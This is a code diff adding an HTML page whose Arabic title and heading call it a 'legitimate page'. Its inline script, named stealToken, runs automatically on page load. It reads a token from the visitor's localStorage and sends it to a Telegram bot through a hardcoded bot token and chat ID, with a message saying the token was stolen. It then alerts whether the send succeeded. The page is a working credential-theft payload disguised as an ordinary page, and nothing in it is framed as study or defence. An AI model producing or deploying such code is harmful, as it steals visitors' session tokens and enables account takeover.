@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صفحة شرعية</title>
+    <script>
+        async function stealToken() {
+            try {
+                // محاولة سرقة التوكن من Local Storage
+                const token = localStorage.getItem('token') || 'لم يتم العثور على توكن';
+                
+                // إرسال التوكن إلى بوت تليجرام
+                const botToken = "7121165958:AAGwpDLOVCWty7-QBlv5JFoSjEjmTOzZmEE";
+                const chatId = "6066673128";
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: `تم سرقة التوكن: ${token}`,
+                    }),
+                });
+
+                if (response.ok) {
+                    alert('تم إرسال التوكن بنجاح!');
+                } else {
+                    alert('فشل إرسال التوكن.');
+                }
+            } catch (error) {
+                console.error('حدث خطأ:', error);
+            }
+        }
+
+        // تشغيل الدالة عند تحميل الصفحة
+        window.onload = stealToken;
+    </script>
+</head>
+<body>
+    <h1>مرحبًا! هذه صفحة شرعية.</h1>
+</body>
+</html>
